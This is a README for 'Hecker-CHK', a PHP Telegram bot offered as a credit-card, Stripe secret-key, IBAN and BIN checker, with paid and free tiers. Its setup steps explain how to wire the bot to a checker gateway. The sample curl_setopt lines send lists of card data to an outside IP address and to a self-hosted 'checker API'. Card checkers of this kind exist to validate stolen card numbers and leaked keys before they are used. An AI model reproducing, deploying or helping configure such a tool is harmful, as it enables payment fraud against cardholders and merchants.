# Consider Using [This](https://github.com/Junaid433/Test-Chemcker-Bot) instead.

# Hecker-CHK
Simple CC Checker Telegram Bot With Fairly Enough Features. Made with PHP. 

# Features 
CC Checker

SK Checker

Iban Checker

IP Checker

BIN Checker

Bug Bin Detection Via TXT File.

Premium and free user system without any my sql database. [ via txt file ]

Stores Results in /tmp folder

# SETUP 

Change $botToken with your api token on modules/global.php

Webhook must be set to bot.php

Host your own checker api files and put link in bot files so it can access it. Files need to be editied with new link : 
au.php , sch.php , spp.php , mch.php , ch.php

Example: Current Link will be like { curl_setopt($ch, CURLOPT_URL, 'http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista.''); } 
it needs to be changed with your new link. After you have changed it should look like { curl_setopt($ch, CURLOPT_URL, 'http://yourcheckerlink.com/api.php?lista='.$lista.''); } 

Add your telegram userid to pre.txt

You will find some codes like this if ($userId == '766109755'){

You need to change $userId with your own id, however bot will still work but you will be missing admin some functions.

If you need any help, pm me on telegram. 
My Telegram - @fakehecker
